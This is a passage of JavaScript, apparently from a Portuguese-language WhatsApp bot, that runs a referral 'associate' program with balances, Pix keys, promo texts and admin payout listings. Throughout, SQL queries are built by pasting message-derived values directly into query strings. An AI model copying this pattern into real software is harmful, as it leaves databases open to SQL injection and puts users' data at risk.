        if (Mensagem_Texto.indexOf("✅ QUERO SER UM ASSOCIADO") > -1 || Mensagem_Texto.toString() === "/querosociedade") {
            await DataBase_Better.prepare(`UPDATE CONTATOS SET ASSOCIADO = '1' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

            TEXTO_VIROU_ASSO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_VIROU_ASSO'`).get()["VALOR"]

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${TEXTO_VIROU_ASSO}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            NOT_NOVO_ASSOCIADO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_NOVO_ASSOCIADO'`).get()["VALOR"]
            if (NOT_NOVO_ASSOCIADO === "1") {

                Texto_Grupo = `👤 *NOVO ASSOCIADO* 👤

👤 *ASSOCIADO:* wa.me/${NUMERO_INDICADOR}

*AGORA ESTE NOVO ASSOCIADO IRÁ LUCRAR UM PERCENTUAL SOBRE TODAS AS COMPRAS DE SEUS INDICADOS!*

*VENHA SER UM ASSOCIADO*

*${Nome_Bot}*
wa.me/${NUMERO_PURO_BOT}`

                for await (Grupo of ID_GRUPOS) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Indicou_GP}',
'${Date.now()}')`).run()
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💼 ÁREA DO ASSOCIADO") > -1 || Mensagem_Texto.toString() === "/socio") {

            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO_INDICACAO"]
            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2);

            TOTAL_INDICADOS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE NUMERO_INDICADOR = '${Mensagem_From}'`).all()

            TOTAL_BONUS_PAGOS = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR_PAGO as FLOAT)) FROM PAGAMENTOS_ASSOCIADO WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SUM(CAST(VALOR_PAGO as FLOAT))"]
            TOTAL_BONUS_PAGOS = parseFloat(TOTAL_BONUS_PAGOS).toFixed(2);
            if (TOTAL_BONUS_PAGOS === "NaN" || TOTAL_BONUS_PAGOS === null) { TOTAL_BONUS_PAGOS = "0" }

            CHAVEPIX_ASSO = await DataBase_Better.prepare(`SELECT CHAVEPIX_INDICADO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["CHAVEPIX_INDICADO"]

            PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
            if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
            } else {
                PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
            }

            Texto = `💼 *ÁREA DO ASSOCIADO* 💼

━━━━━━━❰✭❱━━━━━━━━

*SEU LINK DE INDICAÇÃO:*
wa.me/${NUMERO_PURO_BOT}&text=BONUS_COD#${Numero}
(Se o usuário clicar, vai entrar na conversa com o bot, já com o código pronto para envio.)

》═══════~ *OU* ~═══════《

*CÓDIGO DE INDICAÇÃO:*
BONUS_COD#${Numero}
(Se o usuário mandar isso no bot, vai virar seu indicado.)

━━━━━━━❰✭❱━━━━━━━━


┏◚◚◚◚◚◚◚◚◚◚◚◚┓
*ESTATÍSTICAS DO ASSOCIADO*
┗◛◛◛◛◛◛◛◛◛◛◛◛┛

*BÔNUS/SALDO ATUAL:* R$:${SALDO_INDICACAO}

*TOTAL INDICADOS:* ${TOTAL_INDICADOS.length}

*TOTAL DE BÔNUS PAGOS:* ${TOTAL_BONUS_PAGOS}

*PERCENTUAL ATUAL DE GANHO SOBRE VENDAS:* ${PERCENTUAL_FINAL}%

┏◚◚◚◚◚◚◚◚◚◚◚◚┓
*CHAVE PIX ATUAL: ${CHAVEPIX_ASSO}*
┗◛◛◛◛◛◛◛◛◛◛◛◛┛

*ALTERAR CHAVE PIX*
/chavepix===[CHAVE PIX]

*Exemplo*
/chavepix===larareceber@gmail.com
`
            TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
            if ((TIPOMENU_ATUAL).toString() === "a") {

                CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES DO ASSOCIADO"
                CONSTRUCAO_LISTMESSAGE_title = `OPÇÕES DO ASSOCIADO`
                CONSTRUCAO_LISTMESSAGE_description = Texto

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "TEXTO MODELO PARA DIVULGAÇÃO",
                        description: "Exemplo de texto para divulgar, edite da maneira que desejar.",
                    },
                )
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("TEXTO MODELO PARA DIVULGAÇÃO") > -1) {
            TEXTO_MODELO_DIVUL_ASSOCIADO1 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MODELO_DIVUL_ASSOCIADO1'`).get()["VALOR"]
            TEXTO_MODELO_DIVUL_ASSOCIADO2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MODELO_DIVUL_ASSOCIADO2'`).get()["VALOR"]

            TEXTO_MODELO_DIVUL_ASSOCIADO1 = TEXTO_MODELO_DIVUL_ASSOCIADO1.toString().replace(/\#LINK\#/igm, `wa.me/${NUMERO_PURO_BOT}&text=BONUS_COD#${Numero}`);
            TEXTO_MODELO_DIVUL_ASSOCIADO2 = TEXTO_MODELO_DIVUL_ASSOCIADO2.toString().replace(/\#LINK\#/igm, `wa.me/${NUMERO_PURO_BOT}&text=BONUS_COD#${Numero}`);
            TEXTO_MODELO_DIVUL_ASSOCIADO1 = TEXTO_MODELO_DIVUL_ASSOCIADO1.toString().replace(/\#COD\#/igm, `BONUS_COD#${Numero}`);
            TEXTO_MODELO_DIVUL_ASSOCIADO2 = TEXTO_MODELO_DIVUL_ASSOCIADO2.toString().replace(/\#COD\#/igm, `BONUS_COD#${Numero}`);

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${TEXTO_MODELO_DIVUL_ASSOCIADO1}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${TEXTO_MODELO_DIVUL_ASSOCIADO2}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳











        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ativarasso===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*FUNÇÃO ASSOCIADOS DESATIVADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "1") {
                Texto = `*FUNÇÃO ASSOCIADOS ATIVADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/associadospagar" && Adms.includes(Numero)) {

            CONSTRUCAO_LISTMESSAGE_buttonText = "ASSOCIADOS A PAGAR"
            CONSTRUCAO_LISTMESSAGE_title = `ASSOCIADOS A PAGAR`
            CONSTRUCAO_LISTMESSAGE_description = `*ASSOCIADOS A PAGAR*

Consulte todos os associados que possuem saldos de associado.

Ao selecionar um deles, verá informações como estatísticas e chave Pix.`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            Array_Associados = await DataBase_Better.prepare(`SELECT _rowid_,ID_CONTATO,NOME,STATUS,ID_BOTAO,NUMERO_INDICADOR,BONUS_INDICACAO,SALDO_INDICACAO,SALDO,RECEBEU_SPAM,BLOQUEADO,REEMBOLSADO,DATA_MS_INSERIDO FROM CONTATOS WHERE SALDO_INDICACAO != '0'`).all();
            for await (Associado of Array_Associados) {
                Contato_Asso = Associado["ID_CONTATO"].toString().replace(/[^0-9]/igm, ``);
                CONSTRUCAO_LISTMESSAGE_rows.push({
                    rowId: `${iD_Footer.toString()}|`,
                    title: `${Associado["NOME"]}`,
                    description: `R$:${Associado["SALDO_INDICACAO"]} | ${Contato_Asso} | ID_ASSOa#${Associado["rowid"]}#`
                })
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("ID_ASSOa#") > -1 && Adms.includes(Numero)) {
            Rowid_Asso = Mensagem_Texto.split("ID_ASSOa#")
            Rowid_Asso = Rowid_Asso[1].split("#")
            Rowid_Asso = Rowid_Asso[0]
            console.log("ID_ASSO: " + Rowid_Asso)

            NOME_ASSO = await DataBase_Better.prepare(`SELECT NOME FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["NOME"]
            ID_CONTATO_ASSO = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["ID_CONTATO"]
            NUMERO_ASSO = ID_CONTATO_ASSO.toString().replace(/[^0-9]/igm, ``);
            CHAVEPIX_ASSO = await DataBase_Better.prepare(`SELECT CHAVEPIX_INDICADO FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["CHAVEPIX_INDICADO"]

            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${ID_CONTATO_ASSO}'`).get()["SALDO_INDICACAO"]
            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2);

            TOTAL_INDICADOS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE NUMERO_INDICADOR = '${ID_CONTATO_ASSO}'`).all()

            TOTAL_BONUS_PAGOS = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR_PAGO as FLOAT)) FROM PAGAMENTOS_ASSOCIADO WHERE ID_CONTATO = '${ID_CONTATO_ASSO}'`).get()["SUM(CAST(VALOR_PAGO as FLOAT))"]
            TOTAL_BONUS_PAGOS = parseFloat(TOTAL_BONUS_PAGOS).toFixed(2);
            if (TOTAL_BONUS_PAGOS === "NaN" || TOTAL_BONUS_PAGOS === null) { TOTAL_BONUS_PAGOS = "0" }

            CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"
            CONSTRUCAO_LISTMESSAGE_title = `OPÇÕES DESTE ASSOCIADO`
            CONSTRUCAO_LISTMESSAGE_description = `*ASSOCIADO: ${NOME_ASSO}*

*NÚMERO:* wa.me/${NUMERO_ASSO}

*CHAVE PIX:* ${CHAVEPIX_ASSO}

*ESTATÍSTICAS DO ASSOCIADO*

*BÔNUS/SALDO ATUAL:* R$:${SALDO_INDICACAO}
*TOTAL INDICADOS:* ${TOTAL_INDICADOS.length}
*TOTAL DE BÔNUS PAGOS:* ${TOTAL_BONUS_PAGOS}
`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            Array_Associados = await DataBase_Better.prepare(`SELECT _rowid_,ID_CONTATO,NOME,STATUS,ID_BOTAO,NUMERO_INDICADOR,BONUS_INDICACAO,SALDO_INDICACAO,SALDO,RECEBEU_SPAM,BLOQUEADO,REEMBOLSADO,DATA_MS_INSERIDO FROM CONTATOS WHERE SALDO_INDICACAO != '0'`).all();
            for await (Associado of Array_Associados) {
                Contato_Asso = Associado["ID_CONTATO"].toString().replace(/[^0-9]/igm, ``);
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: `✅ PAGUEI TODO O BÔNUS DESTE ASSOCIADO | ID_ASSOb#${Rowid_Asso}#`,
                        description: " ",
                    },
                )
            }

